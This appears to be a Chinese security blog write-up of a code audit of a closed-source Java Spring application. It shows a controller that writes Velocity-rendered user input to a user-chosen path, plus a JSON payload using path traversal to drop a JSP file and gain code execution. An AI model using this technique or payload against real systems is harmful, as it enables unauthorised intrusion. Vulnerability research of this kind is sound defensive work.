#  JAVA代码审计 | 记录第一次命令执行漏洞  
 WK安全   2026-04-02 05:39  
  
# 免责申明本文章仅用于信息安全防御技术分享，因用于其他用途而产生不良后果,作者不承担任何法律责任，请严格遵循中华人民共和国相关法律法规，禁止做一切违法犯罪行为。  
  
一、前言  
  
    好朋友给了一份闭源的JAVA源码，今天来审计审计，正好检验在小朋友师傅那里学习的如何。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kT0XF3jjTwz8ibu7O0CsRk6QZZWIZvHKqVoaNWV334UhxcjTRykWPOA2PvFQ8ko0ThR1ep5FjicDV3N6lUPl2F5WB0n8gFwPoib28/640?wx_fmt=png&from=appmsg "")  
## 二、框架分析  
  
    在拿到源码之后发现全部为jar包类型的文件，这里靠向Spring方向，进行搜索特征他的路由相关例如：@PostMapping等信息，或者@Controller均可，或者直接搜索Servlet的特征例如：生命周期的方法：service以及doget或者dopost等，逐一排除。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRibl31xaDeSCTfWL3RU1eribJicRvQ3SNxIsn2y1Kljulg74HBriby846mAP1SbAk2zoZuiaUFad7Qlw661IwOq93pYLgg10PaaUy0/640?wx_fmt=png&from=appmsg "")  
  
    搜索后发现确实是Spring类型的源码，那么开始打开小朋友师傅的课件，审计开始审计这套源码。  
## 三、鉴权分析  
  
    因为当时给到了源码之后已经是3G左右，过于庞大，在寻找鉴权的时候发现部分源码是丢失状态，或者不知道跑哪里去了，只是隐隐约约的知道为shiro鉴权，因为我搜到了它。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRmhjP6PS2b022z83Ft1rNRgVCtnf2C7aDo3GC1a7EVHmIwBnfibSEyvibNmxMtZxQlP9o5qycciaAEAOwibuEjHFiaSk94lSYBhbF0/640?wx_fmt=png&from=appmsg "")  
  
    然后再去寻找对应的拦截路径相关的鉴权处理并未找到，询问过后发现确实为部分源码丢失造成的，不过这个也好解决，因为我们有网站对应的Controller路由信息，直接AI提取路由跑一下就可以一眼看出来哪些是拦截的哪些不是拦截的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQnoN5Zftdc3QNzzDpm5UPy9DeUc3cSmicSPEnyycr5ujOMcCAAaOad0Cews1nfdBru5zbzibrqla7Lq0AvFHPSibM2ZAtHJrWBbI/640?wx_fmt=png&from=appmsg "")  
  
    这个命令不错，可以记下来：  
```
ounter(line
find . -name "*.java" | xargs grep -l "@RequestMapping\|@GetMapping\|@PostMapping\|@PutMapping\|@DeleteMapping\|@PatchMapping" 2>/dev/null | head -100
```  
  
    (有AI可以提升很大的审计效率，要是按照以前的办法，现在就要自己手搓一些脚本还要各种调试了）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kS2BqaTicSwHhJsE8fwtgNwN9icXJ8ujgXXgoWk7X1uYoYSpkWJQicydubhbNkWNia6ub3KCibQxO0Q6A5XWZib1VXpzj5B31o34OBmY/640?wx_fmt=png&from=appmsg "")  
  
    然后就是跑了一圈也没发现存在302等信息，随便从路由当中复制一个Controller都可以访问，那这就好办了，下一步开始审计漏洞。  
## 四、RCE漏洞审计  
  
        最终在某一个Controller当中发现存在一个任意文件写入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRUoGfv1Fic8DdWmmRNkOqJJfQvlC6GrVmqaI7ia3icGUL50WzVeJmmumy6leBd1c0ZDv0jpFBNClBCGkqolPibqm81MasBiaptPAa4/640?wx_fmt=png&from=appmsg "")  
  
    首先传递参数为vo类，通过vo类的get方法来获取对应的具体参数名。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQucNOmQBM6eXiaqkmj98vtv2TOMG3sxf2KSnb7CBQBWwouRkaCczic9x79Fk69hGl4CJGKO6AeFACVLFA92RmGniaDia5Ydzdf8Rg/640?wx_fmt=png&from=appmsg "")  
  
    在这里可以传递四个参数，分别为template、path、fileName、tempext四个参数。  
  
    并且四个参数分别path决定路径：  
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
@PostMapping({"/createHtml1"})
    @ResponseBody
    @ApiOperation("发布")
    public JsonResult createHtml1(@RequestBody CreateHtmlVo vo) {
        String path = this.configModelService.getFrontPath() + File.separator + "pub" + File.separator + "html" + vo.getPath();
        Velocity.init();
        VelocityContext context = new VelocityContext();
        StringWriter stringWriter = new StringWriter();
        Velocity.evaluate(context, stringWriter, "mystring", vo.getTemplate());
        File file = new File(path);
        file.mkdirs();
        file = new File(path + File.separator + vo.getFileName() + "." + vo.getTempext());
        InputStream inputStream = null;
        try {
            inputStream = new ByteArrayInputStream(stringWriter.toString().getBytes("UTF-8"));
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        inputstreamtofile(inputStream, file);
        Map<String, String> map = new HashMap();
        map.put("path", "/pub/html" + vo.getPath() + "/" + vo.getFileName() + "." + vo.getTempext());
        return this.renderSuccess(map);
    }
```  
  
    其中fileName决定相关文件名但是不包含后缀，后缀通过tempext来决定，之后直接进行写入到文件当中，对传入的参数未作任何过滤，那么我们通过path决定路径，fileName决定文件名称，tempext决定后缀文件类型，那么文件控制如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRLrjoLKV4gbD6TAbc1oKsV11fNuIgrYC4WsuI4t5Xr6EbjicY49xs6BQQcc0wEdEA6Grr1iaHPUXrM5QdV05XWV8mSsDmia4Ev2c/640?wx_fmt=png&from=appmsg "")  
  
    这里其实就是SSTI进行渲染模板的操作，渲染完之后在进行写入，然而渲染的内容就是我们的参数Template，当然这也说明我们不只是可以进行任意文件写入，还可以直接打模板漏洞。  
## 五、漏洞复现  
  
构造一下payload：  
```
{
  "path": "/../../../upload/headimg",
  "fileName": "test",
  "tempext": "jsp",
  "template": "<%out.println(\"Hello World\");%>"
}
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTtsl1QTebDIgeTEvjuSoKnuXI3KoTv7ZNvqg8lk4TvOwQzRxzULf7WPxa6vaVkxs0egY1C8Q9phYyDba9EjO7oCkGEAcdsJKY/640?wx_fmt=png&from=appmsg "")  
  
      
成功写入，进行访问。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQv4m6DX1dTus84oyCzKbjibqXfQXTwfTlAUJJIPQwYBIjuibIQANT4icvvAGdOzEicBmD8Q0hrv8VmF4UBIfibH1MIGq62WySAp7pY/640?wx_fmt=png&from=appmsg "")  
  
    这里成功进行RCE，同样在这里进行宣传html文件进行模板注入也是可以的，但是RCE我们只需要一个就够了，目的在于学习哈哈哈。  
  
